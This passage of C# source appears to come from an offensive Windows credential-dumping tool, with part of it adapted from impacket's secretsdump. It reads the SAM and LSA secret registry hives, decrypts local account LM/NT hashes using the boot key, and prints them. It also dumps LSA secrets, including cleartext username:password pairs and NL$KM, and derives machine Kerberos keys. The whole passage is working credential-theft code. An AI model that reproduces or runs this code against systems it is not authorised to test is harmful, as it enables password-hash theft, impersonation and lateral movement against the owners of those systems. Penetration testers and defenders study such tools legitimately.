                                            Console.WriteLine(String.Format("{0}:{1}", username, password));
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine("[!] Secret type not supported yet - outputing raw secret as hex");
                                        Console.WriteLine(String.Format("{0}: {1}", secret, Hexlify(secretBlob.secret)));
                                    }
                                }
                            }
                            else
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
                                Console.WriteLine("[*] NL$KM");
                                if (secretBlob.length > 0)
                                {
                                    Console.WriteLine("NL$KM:" + Hexlify(secretBlob.secret));
                                }
                            }
                        }
                    }
                }
                catch (Exception exp)
                {
                    Console.WriteLine(exp.ToString());
                }
                Interop.RegCloseKey(hKey);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        // Copied from secretsdump.py from impacket
        public static void PrintMachineKerberos(byte[] secret, String domainName, String computerName)
        {
            byte[] salt = Encoding.UTF8.GetBytes(String.Format("{0}host{1}.{2}", domainName.ToUpper(), computerName.ToLower(), domainName.ToLower()));

            Encoding UTF16 = Encoding.GetEncoding(UnicodeEncoding.Unicode.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback("�"));
            Encoding UTF8 = Encoding.GetEncoding(UnicodeEncoding.UTF8.CodePage, new EncoderReplacementFallback("?"), new DecoderReplacementFallback());

            byte[] rawSecret = UTF8.GetBytes(UTF16.GetString(secret));

            var kerberosEncryptions = new EncryptionType[]
            {
                EncryptionType.AES256_CTS_HMAC_SHA1_96,
                EncryptionType.AES128_CTS_HMAC_SHA1_96,
                EncryptionType.DES_CBC_MD5
            };

            foreach (EncryptionType type in kerberosEncryptions)
            {
                byte[] key = KeyGenerator.MakeKey(type, UTF8.GetString(rawSecret), UTF8.GetString(salt));
                Console.WriteLine(String.Format("{0}\\{1}$:{2}:{3}", domainName, computerName, type.ToString().ToLower().Replace("_", "-"), Hexlify(key)));
            }
        }

        public static void GetSamAccounts(byte[] bootkey)
        {
            Console.WriteLine("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
            byte[] fVal = GetRegKeyValue("SAM\\Sam\\Domains\\Account", "F");
            byte[] hashedBootKey = GetHashedBootKey(bootkey, fVal);
            byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
            byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");

            IntPtr hKey = IntPtr.Zero;
            IntPtr dummy = IntPtr.Zero;
            String keyPath = "SAM\\Sam\\Domains\\Account\\Users";
            StringBuilder classVal = new StringBuilder(1024);
            int len = 1024;
            int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
            if (result != 0)
            {
                string errorMessage = new Win32Exception((int)result).Message;
                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                return;
            }
            IntPtr number = IntPtr.Zero;
            result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref number, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
            if (result != 0)
            {
                string errorMessage = new Win32Exception((int)result).Message;
                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                return;
            }

            for (int i = 0; i < number.ToInt32(); i++)
            {
                len = 255;
                result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
                if (result != 0)
                {
                    string errorMessage = new Win32Exception((int)result).Message;
                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                    return;
                }

                if (classVal.ToString().StartsWith("0"))
                {
                    byte[] rid = BitConverter.GetBytes(System.Int32.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber));
                    byte[] v = GetRegKeyValue(String.Format("{0}\\{1}", keyPath, classVal), "V");
                    if (v == null || v.Length <= 0)
                        continue;
                    int offset = BitConverter.ToInt32(v, 12) + 204;
                    int length = BitConverter.ToInt32(v, 16);
                    string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                    //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                    int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                    int lmHashLength = BitConverter.ToInt32(v, 160);
                    int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                    int ntHashLength = BitConverter.ToInt32(v, 172);
                    string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                    string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";
                    if (ntHashLength <= 0)
                        continue;

                    // old style hashes
                    if (v[ntHashOffset + 2].Equals(0x01))
                    {
                        IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                        byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                        IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                        byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                        byte[] encryptedLmHash = null;
                        byte[] encryptedNtHash = null;

                        if (ntHashLength == 20)
                        {
                            encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                            ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, classVal.ToString()).Replace("-", "");
                        }
                        if (lmHashLength == 20)
                        {
                            encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                            lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, classVal.ToString()).Replace("-", "");
                        }
                    }
                    //new-style hashes
                    else
                    {
                        byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                        byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (lmData.Length > 0)
                        {
                            byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                            lmHash = Crypto.DecryptSingleHash(desEncryptedHash, classVal.ToString()).Replace("-", "");
                        }

                        byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                        byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (ntData.Length > 0)
                        {
                            byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                            ntHash = Crypto.DecryptSingleHash(desEncryptedHash, classVal.ToString()).Replace("-", "");
                        }
                    }
                    string ridStr = int.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber).ToString();
                    string hashes = (lmHash + ":" + ntHash);
                    Console.WriteLine(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
                }
            }
            Interop.RegCloseKey(hKey);
        }

        private static bool IsZeroes(byte[] inputArray)
        {
            foreach (byte b in inputArray)
            {
                if (b != 0x00)
                {
                    return false;
                }
            }
            return true;
        }

        private static int Pad(int data)
        {
            if ((data & 0x3) > 0)
            {
                return (data + (data & 0x3));
            }
            else
            {
                return data;
            }
        }

        public static byte[] GetRegKeyValue(string keyPath, string valueName = null, bool silent = false)
        {
            IntPtr hKey = IntPtr.Zero;

            // takes a given HKLM key path and returns the registry value

            // open the specified key with read (0x19) privileges
            //  0x80000002 == HKLM
            int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
            if (result != 0)
            {
                string errorMessage = new Win32Exception((int)result).Message;
                Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, result, errorMessage);
                return null;
            }

            int cbData = 0;
            result = Interop.RegQueryValueEx(hKey, valueName, 0, IntPtr.Zero, IntPtr.Zero, ref cbData);
            if (result != 0)
            {
                string errorMessage = new Win32Exception((int)result).Message;
                if (!silent)
                {
                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                }
                return null;
            }

            IntPtr dataPtr = Marshal.AllocHGlobal(cbData);
            result = Interop.RegQueryValueEx(hKey, valueName, 0, IntPtr.Zero, dataPtr, ref cbData);
            if (result != 0)
            {
                string errorMessage = new Win32Exception((int)result).Message;
                if (!silent)
                {
                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
                }
                return null;
            }
            byte[] data = new byte[cbData];

            Marshal.Copy(dataPtr, data, 0, cbData);
            Interop.RegCloseKey(hKey);

            return data;
        }

        public static byte[] StringToByteArray(string hex)
        {
            // helper to convert a string hex representation to a byte array
            // yes, I know this inefficient :)
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context

            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static String Hexlify(byte[] array)
        {
            return BitConverter.ToString(array).Replace("-", "").ToLower();
        }
    }
}
